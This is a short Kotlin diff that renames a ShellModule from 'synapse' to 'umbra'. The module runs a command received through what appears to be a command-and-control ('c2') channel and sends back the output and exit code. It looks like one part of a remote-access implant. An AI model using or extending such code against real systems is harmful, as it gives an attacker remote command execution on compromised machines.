@@ -1,7 +1,7 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
-import org.synapse.core.c2.Command
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.UmbraResponse
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.io.BufferedReader
@@ -9,7 +9,7 @@ import java.io.InputStreamReader
 
 object ShellModule {
 
-    suspend fun exec(cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun exec(cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val command = cmd.params["cmd"] ?: "id"
         val timeout = (cmd.params["timeout"]?.toIntOrNull() ?: 10) * 1000L
 
@@ -23,7 +23,7 @@ object ShellModule {
             val finished = process.waitFor(timeout, java.util.concurrent.TimeUnit.MILLISECONDS)
             if (!finished) {
                 process.destroyForcibly()
-                return@withContext SynapseResponse.ErrorResponse(error = "timeout", module = "shell")
+                return@withContext UmbraResponse.ErrorResponse(error = "timeout", module = "shell")
             }
 
             var line: String?
@@ -32,13 +32,13 @@ object ShellModule {
 
             val exitCode = process.exitValue()
 
-            SynapseResponse.ShellResponse(
+            UmbraResponse.ShellResponse(
                 exit_code = exitCode,
                 stdout = stdout.toString().trim(),
                 stderr = stderr.toString().trim()
             )
         } catch (e: Exception) {
-            SynapseResponse.ErrorResponse(error = "shell:${e.message}", module = "shell")
+            UmbraResponse.ErrorResponse(error = "shell:${e.message}", module = "shell")
         }
     }
 }
